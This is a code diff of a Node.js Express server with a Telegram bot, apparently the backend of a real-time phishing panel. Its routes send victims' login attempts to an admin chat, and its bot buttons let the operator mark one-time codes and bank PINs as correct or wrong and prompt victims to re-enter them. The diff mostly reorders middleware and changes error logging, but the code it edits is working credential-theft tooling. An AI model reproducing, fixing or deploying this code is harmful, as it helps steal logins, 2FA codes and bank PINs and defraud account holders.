@@ -2,7 +2,6 @@ const express = require('express');
 const { Telegraf } = require('telegraf');
 const path = require('path');
 
-// Load environment variables locally if not in production
 if (process.env.NODE_ENV !== 'production') {
     require('dotenv').config();
 }
@@ -10,6 +9,12 @@ if (process.env.NODE_ENV !== 'production') {
 const app = express();
 const PORT = process.env.PORT || 8080;
 const DOMAIN = process.env.RAILWAY_PUBLIC_URL || process.env.DOMAIN || ""; 
+
+// -------------------- CRITICAL BODY PARSERS FIRST --------------------
+// These must be explicitly defined at the top so incoming webhooks and API bodies can be parsed safely
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'public')));
 
 // -------------------- INIT BOT --------------------
 if (!process.env.BOT_TOKEN) {
@@ -20,19 +25,14 @@ if (!process.env.BOT_TOKEN) {
 const bot = new Telegraf(process.env.BOT_TOKEN);
 const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
 
-// -------------------- MEMORY STORE --------------------
-const statusStore = {};
-
 // -------------------- TELEGRAM WEBHOOK MIDDLEWARE --------------------
-// CRITICAL: Placed BEFORE express.json() to prevent streaming/parsing interference
 const WEBHOOK_PATH = `/webhook/${process.env.BOT_TOKEN}`;
 if (DOMAIN) {
     app.use(bot.webhookCallback(WEBHOOK_PATH));
 }
 
-// -------------------- STANDARD MIDDLEWARE --------------------
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+// -------------------- MEMORY STORE --------------------
+const statusStore = {};
 
 // -------------------- ROUTES --------------------
 app.get('/', (req, res) => {
@@ -70,6 +70,7 @@ app.post('/api/login-notification', async (req, res) => {
 ⌛ <b>Timeout: 5 minutes</b>`;
 
     try {
+        console.log(`Sending Login Notification to Admin: ${ADMIN_ID}`);
         await bot.telegram.sendMessage(ADMIN_ID, message, {
             parse_mode: 'HTML',
             reply_markup: {
@@ -83,7 +84,7 @@ app.post('/api/login-notification', async (req, res) => {
         });
         res.json({ success: true });
     } catch (err) {
-        console.error("API login notification error:", err);
+        console.error("Telegram SendMessage Blocked/Failed:", err);
         res.status(500).json({ error: err.message });
     }
 });
@@ -261,7 +262,7 @@ bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Allowed");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(approvedMsg);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error("Error executing approve action:", e.message); }
 });
 
 bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
@@ -274,7 +275,7 @@ bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Rejected");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(deniedMsg);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error("Error executing deny action:", e.message); }
 });
 
 bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
@@ -287,7 +288,7 @@ bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Verified");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(verifiedMsg);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
@@ -297,7 +298,7 @@ bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Wrong Code");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
@@ -310,7 +311,7 @@ bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Finalized");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(verifiedMsg2);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
@@ -320,7 +321,7 @@ bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Wrong Code");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
@@ -332,7 +333,7 @@ bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Bank PIN Verified");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(finalizedMsg);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
@@ -342,7 +343,7 @@ bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Wrong Bank PIN");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
@@ -352,7 +353,7 @@ bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
         await ctx.answerCbQuery("Wrong PIN");
         await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
         await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error(e.message); }
 });
 
 // -------------------- STATUS CHECK --------------------
@@ -379,14 +380,13 @@ app.listen(PORT, async () => {
             const formattedDomain = DOMAIN.startsWith('http') ? DOMAIN : `https://${DOMAIN}`;
             const fullWebhookUrl = `${formattedDomain}${WEBHOOK_PATH}`;
             
-            // This force-switches Telegram over to webhook delivery, instantly breaking any active long-polling conflict loops
             await bot.telegram.setWebhook(fullWebhookUrl, { drop_pending_updates: true });
             console.log(`🤖 Webhook synced completely at: ${fullWebhookUrl}`);
         } catch (err) {
-            console.error("Webhook synchronization failed:", err);
+            console.error("Webhook synchronization failed:", err.message);
         }
     } else {
-        console.error("❌ CRITICAL: RAILWAY_PUBLIC_URL is missing. Webhooks cannot establish a secure link without a DOMAIN mapping.");
+        console.error("❌ CRITICAL: RAILWAY_PUBLIC_URL is missing.");
     }
 });
-        
+                             
